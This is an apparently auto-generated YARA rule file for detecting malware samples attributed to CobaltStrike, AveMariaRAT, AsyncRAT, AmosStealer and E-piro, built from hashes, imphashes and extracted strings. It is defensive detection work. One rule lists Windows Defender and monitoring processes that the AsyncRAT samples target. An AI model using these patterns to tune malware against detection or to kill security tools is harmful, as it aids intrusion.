      $s13 = "t failed (errno= racy sudog adjustment due to parking on channelfunction symbol table not sorted by PC offset: attempted to trac" ascii /* score: '14.00'*/
      $s14 = " runqueue= stopwait= runqsize= gfreecnt= throwing= spinning=atomicand8float64nanfloat32nanException  ptrSize=  targetpc= until p" ascii /* score: '13.00'*/
      $s15 = "runtime.packNetpollKey" fullword ascii /* score: '13.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 23000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" and ( 8 of them )
      ) or ( all of them )
}

rule _b069d88b33e75313d6c2f825eb1f4188_imphash__E_piro_signature__c9596ccdffde444fa435c5f9042f7548_imphash__62 {
   meta:
      description = "_subset_batch - from files b069d88b33e75313d6c2f825eb1f4188(imphash).exe, E-piro(signature)_c9596ccdffde444fa435c5f9042f7548(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f33b9f92f7844ac3e037328500c492c231ad480658f63f5a3f306d4899b1509d"
      hash2 = "bcd6cf9ae14f189191f56ddd643585681fd65271ff7f0c6a4ba9000a316d3001"
   strings:
      $s1 = "PSystem.Collections.ICollection.get_Count0InitializeClosedInstance@" fullword ascii /* score: '18.00'*/
      $s2 = "Concurrent operations from multiple threads on this type are not supported" fullword wide /* score: '15.00'*/
      $s3 = "HDetermineMinSpinCountForAdaptiveSpin2GetWaiterForCurrentThread" fullword ascii /* score: '12.00'*/
      $s4 = "MdBinaryReader'" fullword ascii /* score: '10.00'*/
      $s5 = ":get_FunctionPointerParameters\"get_ValueTypeSize" fullword ascii /* score: '9.00'*/
      $s6 = "4TypeForwardedFromAttribute" fullword ascii /* score: '9.00'*/
      $s7 = "<GetCorElementTypeOfElementType" fullword ascii /* score: '9.00'*/
      $s8 = "&get_HasLeftoverData>TryDrainLeftoverDataForGetBytes@" fullword ascii /* score: '9.00'*/
      $s9 = "*GetUtf8SequenceLength@" fullword ascii /* score: '9.00'*/
      $s10 = "encodin" fullword wide /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 10000KB and ( all of them )
      ) or ( all of them )
}

rule _cdeb2447c20e44de177a8f9fbc6f544f_imphash__CobaltStrike_signature__f668fce5020bf868ac72f3f764327e2a_imphash__63 {
   meta:
      description = "_subset_batch - from files cdeb2447c20e44de177a8f9fbc6f544f(imphash).dll, CobaltStrike(signature)_f668fce5020bf868ac72f3f764327e2a(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "36fc31253dbc1148cb37af2898220a7655e2ebef3be28da8599d0a81e60929ad"
      hash2 = "ccf101ea9a1ae213b93a7d9b6dc7295803ec7003024966da49f5f7c8438a4145"
   strings:
      $s1 = "emutls_mutex" fullword ascii /* score: '15.00'*/
      $s2 = "libloaderapi.h" fullword ascii /* score: '13.00'*/
      $s3 = ".text$__cxa_get_exception_ptr" fullword ascii /* score: '9.00'*/
      $s4 = ".text$_ZSt14get_unexpectedv" fullword ascii /* score: '9.00'*/
      $s5 = ".text$__cxa_get_globals" fullword ascii /* score: '9.00'*/
      $s6 = ".text$_ZL16get_adjusted_ptrPKSt9type_infoS1_PPv" fullword ascii /* score: '9.00'*/
      $s7 = ".text$_ZL17parse_lsda_headerP15_Unwind_ContextPKhP16lsda_header_info" fullword ascii /* score: '9.00'*/
      $s8 = ".text$__cxa_get_globals_fast" fullword ascii /* score: '9.00'*/
      $s9 = ".text$_ZSt13get_terminatev" fullword ascii /* score: '9.00'*/
      $s10 = ".data$_ZZN9__gnu_cxx27__verbose_terminate_handlerEvE11terminating" fullword ascii /* score: '8.00'*/
      $s11 = ".data$_ZN10__cxxabiv120__unexpected_handlerE" fullword ascii /* score: '8.00'*/
      $s12 = ".data$_ZN10__cxxabiv119__terminate_handlerE" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 9000KB and ( 8 of them )
      ) or ( all of them )
}

rule _AveMariaRAT_signature__c149ad8b73121762d33844ffa5c7ca51_imphash__b069d88b33e75313d6c2f825eb1f4188_imphash__E_piro_signature_64 {
   meta:
      description = "_subset_batch - from files AveMariaRAT(signature)_c149ad8b73121762d33844ffa5c7ca51(imphash).exe, b069d88b33e75313d6c2f825eb1f4188(imphash).exe, E-piro(signature)_c9596ccdffde444fa435c5f9042f7548(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "a868126d10484d16bad327ab13861c0a479a7d809a567d8623cf720d2c31022d"
      hash2 = "f33b9f92f7844ac3e037328500c492c231ad480658f63f5a3f306d4899b1509d"
      hash3 = "bcd6cf9ae14f189191f56ddd643585681fd65271ff7f0c6a4ba9000a316d3001"
   strings:
      $s1 = ".AbandonedMutexException" fullword ascii /* score: '15.00'*/
      $s2 = "Must complete Convert() operation or call Encoder.Reset() before calling GetBytes() or GetByteCount(). Encoder '{0}' fallback '{" wide /* score: '15.00'*/
      $s3 = "SignalAll" fullword ascii /* base64 encoded string 'J('jP%' */ /* score: '14.00'*/
      $s4 = ".GetKeyNotFoundException" fullword ascii /* score: '12.00'*/
      $s5 = ".get_AddressOfEntryPoint@" fullword ascii /* score: '12.00'*/
      $s6 = "System.Console" fullword ascii /* score: '10.00'*/
      $s7 = "There are too many threads currently waiting on the event. A maximum of {0} waiting threads are supported" fullword wide /* score: '10.00'*/
      $s8 = "Thread failed to start" fullword wide /* score: '10.00'*/
      $s9 = "6InternalGetCodePageDataItem" fullword ascii /* score: '9.00'*/
      $s10 = "DecodeFirstRune@" fullword ascii /* score: '9.00'*/
      $s11 = "GetBytesFast@" fullword ascii /* score: '9.00'*/
      $s12 = " GetCharCountFast@" fullword ascii /* score: '9.00'*/
      $s13 = "GetCharsFast@" fullword ascii /* score: '9.00'*/
      $s14 = "BDrainRemainingDataForGetByteCount@" fullword ascii /* score: '9.00'*/
      $s15 = "$get_CurrentCulture$set_CurrentCulture" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 10000KB and ( 8 of them )
      ) or ( all of them )
}

rule _b93db3237adc9f9fb50c409480767c6d21f842474905c6df39f84698f5b2169e_b93db323_CobaltStrike_signature__d42595b695fc008ef2c56aabd_65 {
   meta:
      description = "_subset_batch - from files b93db3237adc9f9fb50c409480767c6d21f842474905c6df39f84698f5b2169e_b93db323.elf, CobaltStrike(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, d42595b695fc008ef2c56aabd8efd68e(imphash).exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_1fc8d079.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_41b402ff.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_72d757ad.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_7610fe95.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_979bd820.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_c95056c2.exe, dd56a47d6b039b230286c0327d6693062fc843602ac0e3613214735503f798ed_dd56a47d.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b93db3237adc9f9fb50c409480767c6d21f842474905c6df39f84698f5b2169e"
      hash2 = "1bfa20d4e9e1348710eaaed406bd5e65302945ab0ce43ee0943884697781a0b1"
      hash3 = "1d5227118354b0c6d70089730cf121de3ba51e0d9c9c478189559b9e93a890ac"
      hash4 = "1fc8d0798605394a2a0dbc39c80bf5221483668c22faf6782e5254cbbd90a1d3"
      hash5 = "41b402ff6d432fcff5fb710bfb271bdf8d7838eaad5d7f35aac354036b40f18b"
      hash6 = "72d757ad3719b02a93bb17b3600d349d98fcc283ef168300ba8660ca1f5601d0"
      hash7 = "7610fe95df2a433e8d52377e8301642dacb2e66b19d695f568a6b745d68fd3c5"
      hash8 = "979bd8203f5ad91bb5cd844c51045a244004d6c43c88e11af7bb56cf312dfa6f"
      hash9 = "c95056c2dabb09cdb82d775737ebc1d6b4feab38256357ff66e3a122334e0cfc"
      hash10 = "dd56a47d6b039b230286c0327d6693062fc843602ac0e3613214735503f798ed"
   strings:
      $s1 = "dressmspan.sweep: bad span stateinvalid profile bucket typeruntime: corrupted polldescruntime: netpollinit failedruntime: asyncP" ascii /* score: '18.00'*/
      $s2 = "internal/poll.(*fdMutex).rwlock" fullword ascii /* score: '15.00'*/
      $s3 = "internal/poll.(*fdMutex).rwunlock" fullword ascii /* score: '15.00'*/
      $s4 = "reflect.Value.Comparable" fullword ascii /* score: '14.00'*/
      $s5 = "runtime.netpollblockcommit" fullword ascii /* score: '13.00'*/
      $s6 = "internal/reflectlite.rtype.Comparable" fullword ascii /* score: '11.00'*/
      $s7 = "internal/reflectlite.(*rtype).Comparable" fullword ascii /* score: '11.00'*/
      $s8 = "reflect.(*rtype).common" fullword ascii /* score: '11.00'*/
      $s9 = "reflect.(*Value).Comparable" fullword ascii /* score: '11.00'*/
      $s10 = "reflect.(*rtype).Comparable" fullword ascii /* score: '11.00'*/
      $s11 = "runtime.netpollgoready.goready.func1" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.netpollblock" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.pollInfo.expiredWriteDeadline" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.pollInfo.eventErr" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.mapinitnoop" fullword ascii /* score: '10.00'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0x5a4d ) and filesize < 24000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" and ( 8 of them )
      ) or ( all of them )
}

rule _AmosStealer_signature__b8d675f4_AmosStealer_signature__be774bf2_AmosStealer_signature__c881261a_AmosStealer_signature__fd48_66 {
   meta:
      description = "_subset_batch - from files AmosStealer(signature)_b8d675f4.macho, AmosStealer(signature)_be774bf2.macho, AmosStealer(signature)_c881261a.macho, AmosStealer(signature)_fd48b2ad.macho"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b8d675f4806d4c78cf1a2f8a2ecbd72a40de6fcdcebbb1c7def243684af6f001"
      hash2 = "be774bf244575307c2684353d36e538758b1bbeee0317e1486b9d69677d11732"
      hash3 = "c881261a9d1ce2affce92eb3e55feb225bd57651bb9cb8e6434b481aa0fc87cd"
      hash4 = "fd48b2ada04b3bd200651e94aacb2b446a1e61bcc93652248bba02a8a3265f9f"
   strings:
      $s1 = "@__ZTSSt11logic_error" fullword ascii /* score: '12.00'*/
      $s2 = "@__ZNSt11logic_errorC2EPKc" fullword ascii /* score: '12.00'*/
      $s3 = "thread constructor failed" fullword ascii /* score: '12.00'*/
      $s4 = "@__ZTISt11logic_error" fullword ascii /* score: '12.00'*/
      $s5 = "1logic_error" fullword ascii /* score: '12.00'*/
      $s6 = "@__ZTSSt13runtime_error" fullword ascii /* score: '10.00'*/
      $s7 = "@__ZNSt3__120__throw_system_errorEiPKc" fullword ascii /* score: '10.00'*/
      $s8 = "__ZNSt3__120__throw_system_errorEiPKc" fullword ascii /* score: '10.00'*/
      $s9 = "@__ZNSt13runtime_errorD1Ev" fullword ascii /* score: '10.00'*/
      $s10 = "@__ZNSt13runtime_errorC1EPKc" fullword ascii /* score: '10.00'*/
      $s11 = "3runtime_error" fullword ascii /* score: '10.00'*/
      $s12 = "@__ZTISt13runtime_error" fullword ascii /* score: '10.00'*/
      $s13 = "bigdeals" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0xfeca and filesize < 10000KB and ( 8 of them )
      ) or ( all of them )
}

rule _AveMariaRAT_signature__346c9b88ded843c92a3b0721fedbbd3d_imphash__E_piro_signature__c9596ccdffde444fa435c5f9042f7548_imphash_67 {
   meta:
      description = "_subset_batch - from files AveMariaRAT(signature)_346c9b88ded843c92a3b0721fedbbd3d(imphash).exe, E-piro(signature)_c9596ccdffde444fa435c5f9042f7548(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "5066c7ce14b8a3cc419d9a3211b1e13e22b6376f8cec8c91f23767830de6a869"
      hash2 = "bcd6cf9ae14f189191f56ddd643585681fd65271ff7f0c6a4ba9000a316d3001"
   strings:
      $s1 = "2RefreshCurrentProcessorId2ProcessorNumberSpeedCheck*UninlinedThreadStatic$get_SafeWaitHandle@" fullword ascii /* score: '20.00'*/
      $s2 = ".get_ShouldLogInEventLog" fullword ascii /* score: '20.00'*/
      $s3 = "ExecutionDomain.ReflectionCoreExecution" fullword ascii /* score: '19.00'*/
      $s4 = "ModuleFixupCell PROCESSOR_NUMBER&RTL_OSVERSIONINFOEX" fullword ascii /* score: '18.00'*/
      $s5 = "&ReflectionExecution'" fullword ascii /* score: '16.00'*/
      $s6 = "*ProcessorArchitecture&AssemblyContentType\"AssemblyNameFlags" fullword ascii /* score: '16.00'*/
      $s7 = "IKeyedItem`1" fullword ascii /* score: '12.00'*/
      $s8 = "GetOSVersion4GetEnvironmentVariableCoreLGetEnvironmentVariableCore_NoArrayPool" fullword ascii /* score: '12.00'*/
      $s9 = "UninitializeCom2get_ReentrantWaitsEnabled.GetCurrentApartmentType" fullword ascii /* score: '12.00'*/
      $s10 = "$LowLevelSpinWaiter ProcessorIdCache" fullword ascii /* score: '11.00'*/
      $s11 = "*AppendCustomFormatter8AppendFormattedWithTempSpace@" fullword ascii /* score: '11.00'*/
      $s12 = ">InitializeComForFinalizerThread" fullword ascii /* score: '10.00'*/
      $s13 = "<ComputeMethodSignatureHashCode" fullword ascii /* score: '10.00'*/
      $s14 = "LdTokenHelpers$RuntimeInteropData'" fullword ascii /* score: '10.00'*/
      $s15 = "GetOrAdd@" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 10000KB and ( 8 of them )
      ) or ( all of them )
}

rule _b93db3237adc9f9fb50c409480767c6d21f842474905c6df39f84698f5b2169e_b93db323_CobaltStrike_signature__d42595b695fc008ef2c56aabd_68 {
   meta:
      description = "_subset_batch - from files b93db3237adc9f9fb50c409480767c6d21f842474905c6df39f84698f5b2169e_b93db323.elf, CobaltStrike(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, d42595b695fc008ef2c56aabd8efd68e(imphash).exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_1fc8d079.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_41b402ff.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_72d757ad.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_7610fe95.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_979bd820.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_c95056c2.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b93db3237adc9f9fb50c409480767c6d21f842474905c6df39f84698f5b2169e"
      hash2 = "1bfa20d4e9e1348710eaaed406bd5e65302945ab0ce43ee0943884697781a0b1"
      hash3 = "1d5227118354b0c6d70089730cf121de3ba51e0d9c9c478189559b9e93a890ac"
      hash4 = "1fc8d0798605394a2a0dbc39c80bf5221483668c22faf6782e5254cbbd90a1d3"
      hash5 = "41b402ff6d432fcff5fb710bfb271bdf8d7838eaad5d7f35aac354036b40f18b"
      hash6 = "72d757ad3719b02a93bb17b3600d349d98fcc283ef168300ba8660ca1f5601d0"
      hash7 = "7610fe95df2a433e8d52377e8301642dacb2e66b19d695f568a6b745d68fd3c5"
      hash8 = "979bd8203f5ad91bb5cd844c51045a244004d6c43c88e11af7bb56cf312dfa6f"
      hash9 = "c95056c2dabb09cdb82d775737ebc1d6b4feab38256357ff66e3a122334e0cfc"
   strings:
      $s1 = "internal/runtime/maps.(*table).getWithKey" fullword ascii /* score: '15.00'*/
      $s2 = "internal/runtime/maps.(*Map).getWithKey" fullword ascii /* score: '15.00'*/
      $s3 = "internal/runtime/maps.(*Iter).grownKeyElem" fullword ascii /* score: '15.00'*/
      $s4 = "runtime.getStaticuint64s" fullword ascii /* score: '15.00'*/
      $s5 = "cmp.Compare[go.shape.string]" fullword ascii /* score: '14.00'*/
      $s6 = "cmp.Compare[go.shape.float64]" fullword ascii /* score: '14.00'*/
      $s7 = "cmp.Compare[go.shape.uintptr]" fullword ascii /* score: '14.00'*/
      $s8 = "cmp.Compare[go.shape.uint64]" fullword ascii /* score: '14.00'*/
      $s9 = "cmp.Compare[go.shape.int64]" fullword ascii /* score: '14.00'*/
      $s10 = "internal/runtime/maps.(*Iter).Key" fullword ascii /* score: '13.00'*/
      $s11 = "2*[]struct { key string; elem *unicode.RangeTable }" fullword ascii /* score: '12.00'*/
      $s12 = "0*struct { key string; elem *unicode.RangeTable }" fullword ascii /* score: '12.00'*/
      $s13 = "3*[8]struct { key string; elem *unicode.RangeTable }" fullword ascii /* score: '12.00'*/
      $s14 = "c.Pointer[sync.poolChainElt] }]).CompareAndSwap" fullword ascii /* score: '11.00'*/
      $s15 = "sync/atomic.(*Uint64).CompareAndSwap" fullword ascii /* score: '11.00'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0x5a4d ) and filesize < 24000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" and ( 8 of them )
      ) or ( all of them )
}

rule _CobaltStrike_signature__9cbefe68f395e67356e2a5d8d1b285c0_imphash__CobaltStrike_signature__d42595b695fc008ef2c56aabd8efd68e__69 {
   meta:
      description = "_subset_batch - from files CobaltStrike(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, CobaltStrike(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_72d757ad.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_c95056c2.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "4390de792c33fb358e49444f5c40349d2f0929ccf1820b98bc4c29cd08ef475c"
      hash2 = "1bfa20d4e9e1348710eaaed406bd5e65302945ab0ce43ee0943884697781a0b1"
      hash3 = "72d757ad3719b02a93bb17b3600d349d98fcc283ef168300ba8660ca1f5601d0"
      hash4 = "c95056c2dabb09cdb82d775737ebc1d6b4feab38256357ff66e3a122334e0cfc"
   strings:
      $s1 = "*windows.DLL" fullword ascii /* score: '20.00'*/
      $s2 = "golang.org/x/sys/windows.(*DLLError).Error" fullword ascii /* score: '18.00'*/
      $s3 = "golang.org/x/sys/windows.getSystemDirectory" fullword ascii /* score: '18.00'*/
      $s4 = "golang.org/x/sys/windows.GetSystemDirectory" fullword ascii /* score: '18.00'*/
      $s5 = "*windows.DLLError" fullword ascii /* score: '16.00'*/
      $s6 = "golang.org/x/sys/windows.getStdHandle" fullword ascii /* score: '15.00'*/
      $s7 = "golang.org/x/sys/windows.LoadDLL" fullword ascii /* score: '15.00'*/
      $s8 = "golang.org/x/sys/windows.(*LazyDLL).NewProc" fullword ascii /* score: '15.00'*/
      $s9 = "golang.org/x/sys/windows.(*LazyDLL).Load" fullword ascii /* score: '15.00'*/
      $s10 = "golang.org/x/sys/windows.GetStdHandle" fullword ascii /* score: '15.00'*/
      $s11 = "golang.org/x/sys/windows.(*DLL).FindProc" fullword ascii /* score: '15.00'*/
      $s12 = "golang.org/x/sys/windows.initCanDoSearchSystem32" fullword ascii /* score: '14.00'*/
      $s13 = "golang.org/x/sys/windows.canDoSearchSystem32" fullword ascii /* score: '14.00'*/
      $s14 = "C:/Program Files/Go/src/os/executable_windows.go" fullword ascii /* score: '12.00'*/
      $s15 = "C:/Program Files/Go/src/os/executable.go" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 14000KB and ( 8 of them )
      ) or ( all of them )
}

rule _AsyncRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__16a1317a_AsyncRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_70 {
   meta:
      description = "_subset_batch - from files AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_16a1317a.exe, AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_aa5c7d69.exe, AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_cf81bd30.exe, AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d02aaed6.exe, AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ff37506f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "16a1317ad2b3a3464c1c97066ce8329a96b226607760393c29eb145e8c7c666c"
      hash2 = "aa5c7d69d06c6fe831464fe03e9ad4e58fb0e49f0c70b1b56741db2fd758154e"
      hash3 = "cf81bd30b1d48f5a189ce44e19651e2d20d652ee0e05aa3efcb97485e6c8fd17"
      hash4 = "d02aaed66b0f5d3b7aafd34537621875beb5aac2f2340f3f49075ce2691af6ac"
      hash5 = "ff37506f2c1d82d61f2eadefe66a685d1142d29b7790d90b76c5969a282cc752"
   strings:
      $x1 = "ProcessHacker.exe" fullword wide /* score: '33.00'*/
      $s2 = "MpCmdRun.exe" fullword wide /* score: '28.00'*/
      $s3 = "ConfigSecurityPolicy.exe" fullword wide /* score: '25.00'*/
      $s4 = "MSConfig.exe" fullword wide /* score: '25.00'*/
      $s5 = "procexp.exe" fullword wide /* score: '22.00'*/
      $s6 = "MSASCui.exe" fullword wide /* score: '22.00'*/
      $s7 = "MsMpEng.exe" fullword wide /* score: '22.00'*/
      $s8 = "MpUXSrv.exe" fullword wide /* score: '22.00'*/
      $s9 = "NisSrv.exe" fullword wide /* score: '22.00'*/
      $s10 = "Regedit.exe" fullword wide /* score: '22.00'*/
      $s11 = "<dpiAwareness xmlns=\"http://schemas.microsoft.com/SMI/2016/WindowsSettings\">PerMonitorV2, PerMonitor</dpiAwareness>" fullword ascii /* score: '17.00'*/
      $s12 = "<longPathAware xmlns=\"http://schemas.microsoft.com/SMI/2016/WindowsSettings\">true</longPathAware>" fullword ascii /* score: '17.00'*/
      $s13 = "AntiProcess" fullword ascii /* score: '15.00'*/
      $s14 = "Anti_Process" fullword ascii /* score: '15.00'*/
      $s15 = "dwProcessHandle" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 10000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _AveMariaRAT_signature__346c9b88ded843c92a3b0721fedbbd3d_imphash__AveMariaRAT_signature__c149ad8b73121762d33844ffa5c7ca51_im_71 {
   meta:
      description = "_subset_batch - from files AveMariaRAT(signature)_346c9b88ded843c92a3b0721fedbbd3d(imphash).exe, AveMariaRAT(signature)_c149ad8b73121762d33844ffa5c7ca51(imphash).exe, E-piro(signature)_c9596ccdffde444fa435c5f9042f7548(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "5066c7ce14b8a3cc419d9a3211b1e13e22b6376f8cec8c91f23767830de6a869"
      hash2 = "a868126d10484d16bad327ab13861c0a479a7d809a567d8623cf720d2c31022d"
      hash3 = "bcd6cf9ae14f189191f56ddd643585681fd65271ff7f0c6a4ba9000a316d3001"
   strings:
      $s1 = "BSystem.Collections.Concurrent.dll" fullword ascii /* score: '26.00'*/
      $s2 = "System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii /* score: '24.00'*/
      $s3 = "GetKeyHashCode@" fullword ascii /* score: '15.00'*/
      $s4 = "2TypeLoaderExceptionHelper" fullword ascii /* score: '13.00'*/
      $s5 = "<GetInlinedThreadStaticBaseSlow" fullword ascii /* score: '12.00'*/
      $s6 = " GetValueHashCode@" fullword ascii /* score: '12.00'*/
      $s7 = "6RegularGetValueTypeHashCode@" fullword ascii /* score: '12.00'*/
      $s8 = "4InitializeCommandLineArgsW" fullword ascii /* score: '12.00'*/
      $s9 = "LGetCultureNotSupportedExceptionMessage GetCultureByName" fullword ascii /* score: '12.00'*/
      $s10 = "4DecrementRunningForeground0WaitForForegroundThreads6GetOSHandleForCurrentThread" fullword ascii /* score: '12.00'*/
      $s11 = "*GetUserDefaultCulture0GetUserDefaultLocaleName@" fullword ascii /* score: '11.00'*/
      $s12 = "PropertyInfo2TargetInvocationException" fullword ascii /* score: '10.00'*/
      $s13 = "Failed to set the specified COM apartment state. Current apartment state '{0}'" fullword wide /* score: '10.00'*/
      $s14 = "6get_IsGenericTypeDefinition" fullword ascii /* score: '9.00'*/
      $s15 = "LocalFree$SetThreadErrorMode" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 10000KB and ( 8 of them )
      ) or ( all of them )
}

rule _CobaltStrike_signature__d42595b695fc008ef2c56aabd8efd68e_imphash__d42595b695fc008ef2c56aabd8efd68e_imphash__d42595b695fc008_72 {
   meta:
      description = "_subset_batch - from files CobaltStrike(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, d42595b695fc008ef2c56aabd8efd68e(imphash).exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_1fc8d079.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_41b402ff.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_72d757ad.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_7610fe95.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_979bd820.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_c95056c2.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1bfa20d4e9e1348710eaaed406bd5e65302945ab0ce43ee0943884697781a0b1"
      hash2 = "1d5227118354b0c6d70089730cf121de3ba51e0d9c9c478189559b9e93a890ac"
      hash3 = "1fc8d0798605394a2a0dbc39c80bf5221483668c22faf6782e5254cbbd90a1d3"
      hash4 = "41b402ff6d432fcff5fb710bfb271bdf8d7838eaad5d7f35aac354036b40f18b"
      hash5 = "72d757ad3719b02a93bb17b3600d349d98fcc283ef168300ba8660ca1f5601d0"
      hash6 = "7610fe95df2a433e8d52377e8301642dacb2e66b19d695f568a6b745d68fd3c5"
      hash7 = "979bd8203f5ad91bb5cd844c51045a244004d6c43c88e11af7bb56cf312dfa6f"
      hash8 = "c95056c2dabb09cdb82d775737ebc1d6b4feab38256357ff66e3a122334e0cfc"
   strings:
      $s1 = "internal/poll.execIO" fullword ascii /* score: '16.00'*/
      $s2 = "internal/syscall/windows.ErrorLoadingGetTempPath2" fullword ascii /* score: '15.00'*/
      $s3 = "sync/atomic.(*Pointer[go.shape.struct { os.mu sync.Mutex; os.buf *[]uint8; os.bufp int; os.h syscall.Handle; os.vol uint32; os.c" ascii /* score: '14.00'*/
      $s4 = " checkdead: find g runlock of unlocked rwmutexsigsend: inconsistent statemakeslice: len out of rangemakeslice: cap out of rangeg" ascii /* score: '14.00'*/
      $s5 = "sync/atomic.(*Pointer[go.shape.struct { os.mu sync.Mutex; os.buf *[]uint8; os.bufp int; os.h syscall.Handle; os.vol uint32; os.c" ascii /* score: '14.00'*/
      $s6 = "internal/poll.(*operation).InitBuf" fullword ascii /* score: '9.00'*/
      $s7 = "ServiceFlags2" fullword ascii /* score: '8.00'*/
      $s8 = "ServiceFlags3" fullword ascii /* score: '8.00'*/
      $s9 = "ServiceFlags1" fullword ascii /* score: '8.00'*/
      $s10 = "ServiceFlags4" fullword ascii /* score: '8.00'*/
      $s11 = "syscall.(*DLLError).Unwrap" fullword ascii /* score: '8.00'*/
      $s12 = "internal/syscall/windows.rtlGetVersion" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 14000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" and ( 8 of them )
      ) or ( all of them )
}

rule _AveMariaRAT_signature__c149ad8b73121762d33844ffa5c7ca51_imphash__E_piro_signature__c9596ccdffde444fa435c5f9042f7548_imphash_73 {
   meta:
      description = "_subset_batch - from files AveMariaRAT(signature)_c149ad8b73121762d33844ffa5c7ca51(imphash).exe, E-piro(signature)_c9596ccdffde444fa435c5f9042f7548(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "a868126d10484d16bad327ab13861c0a479a7d809a567d8623cf720d2c31022d"
      hash2 = "bcd6cf9ae14f189191f56ddd643585681fd65271ff7f0c6a4ba9000a316d3001"
   strings:
      $s1 = "Serialization(ConstrainedExecution\"ExceptionServices" fullword ascii /* score: '19.00'*/
      $s2 = "DependentHandle\"TypeLoaderExports[" fullword ascii /* score: '16.00'*/
      $s3 = "RecycleId$GetCurrentThreadId" fullword ascii /* score: '15.00'*/
      $s4 = "System.Collections.Generic.IEnumerable<System.Char>.GetEnumerator@" fullword ascii /* score: '15.00'*/
      $s5 = "<GetActualTargetFunctionPointer@" fullword ascii /* score: '14.00'*/
      $s6 = "IsThunkInHeap,TryGetThunkDataAddress" fullword ascii /* score: '12.00'*/
      $s7 = "Stream length must be non-negative and less than 2^31 - 1 - origin" fullword wide /* score: '12.00'*/
      $s8 = "ComputeHash@" fullword ascii /* score: '10.00'*/
      $s9 = "(set_CurrentUICulture(get_InvariantCulture" fullword ascii /* score: '9.00'*/
      $s10 = "GetLowerBound InternalGetValue@" fullword ascii /* score: '9.00'*/
      $s11 = "GetValueLocked@" fullword ascii /* score: '9.00'*/
      $s12 = "GetPreamble@" fullword ascii /* score: '9.00'*/
      $s13 = "(InvalidCastException2InvalidOperationException.InvalidProgramException*MemberAccessException MemoryExtensions,MissingMemberExce" ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 10000KB and ( 8 of them )
      ) or ( all of them )
}

